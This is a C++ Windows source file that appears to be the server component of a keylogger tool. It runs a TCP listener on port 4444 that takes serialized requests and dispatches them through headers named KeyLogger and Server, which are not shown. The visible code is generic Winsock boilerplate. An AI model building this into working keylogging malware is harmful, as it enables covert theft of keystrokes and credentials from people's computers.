#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <thread>
#include <atomic>
#include <cstring>

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#include "KeyLogger.h"
#include "Server.h"
#include "common/Request.h"

using namespace std;

#define DEFAULT_PORT "4444"


SOCKET ListenSocket = INVALID_SOCKET;
atomic_bool stopServer;

// TODO NOTIFY ON ERROR
int server() {
    WSADATA wsaData;
    int iResult;

    SOCKET ClientSocket = INVALID_SOCKET;

    struct addrinfo *result = NULL;
    struct addrinfo hints;

    int iSendResult;
    
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Create a SOCKET for the server to listen for client connections.
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    // Setup the TCP listening socket
    iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    freeaddrinfo(result);

    // Server Side
    cout << "Server started!\n";

    Server server;
    unique_ptr<char[]> recvbuf(new char[8192]());
    const int recvbuflen = 8192;

    // Server loop
    while (!stopServer) {
        iResult = listen(ListenSocket, SOMAXCONN);
        if (iResult == SOCKET_ERROR) {
            printf("listen failed with error: %d\n", WSAGetLastError());
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }

        // Accept a client socket
        ClientSocket = accept(ListenSocket, NULL, NULL);
        if (ClientSocket == INVALID_SOCKET) {
            printf("accept failed with error: %d\n", WSAGetLastError());
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }

        // Receive request
        int len = 0; 
        string s; 
        while ((iResult = recv(ClientSocket, recvbuf.get(), recvbuflen, 0)) > 0) {
            if (iResult < 0) {
                // NOTIFY
                break;
            }

            len += iResult;
            s += string(recvbuf.get(), iResult);
        }
    
        // printf("Bytes received: %d\n", len);
        // printf("Received: %s\n", recvbuf);
        cout << "Debug: Received: " << len << " bytes\n";

        Request request;
        Response response;
        request.deserialize(s);

        // Process request
        server.processRequest(request, response);

        // Send response
        string sendbuf = response.serialize();
        int total = sendbuf.size();
        len = 0;
        while ((iResult = send(ClientSocket, sendbuf.c_str() + len, total - len, 0)) > 0) {
           if (iResult < 0) {
                // NOTIFY
                cout << "Send error: " <<  WSAGetLastError() << "\n";
                break;
            }

            len += iResult;
        }

        cout << "Debug: Sent " << len << "/" << total << " bytes\n";
       
        // shutdown the connection since we're done (EOF signal?)
        iResult = shutdown(ClientSocket, SD_SEND);
        if (iResult == SOCKET_ERROR) {
            printf("shutdown failed with error: %d\n", WSAGetLastError());
            closesocket(ClientSocket);
            WSACleanup();
            return 1;
        }

        // Close client socket
        closesocket(ClientSocket);
    }

    closesocket(ListenSocket);

    // shutdown the connection since we're done
    iResult = shutdown(ClientSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ClientSocket);
        WSACleanup();
        return 1;
    }

    // cleanup
    WSACleanup();
    return 0;
}

int main() {
    stopServer = false;
    thread serverThread(server);
    serverThread.join();

    while (true) {
        
    }

    return 0;
}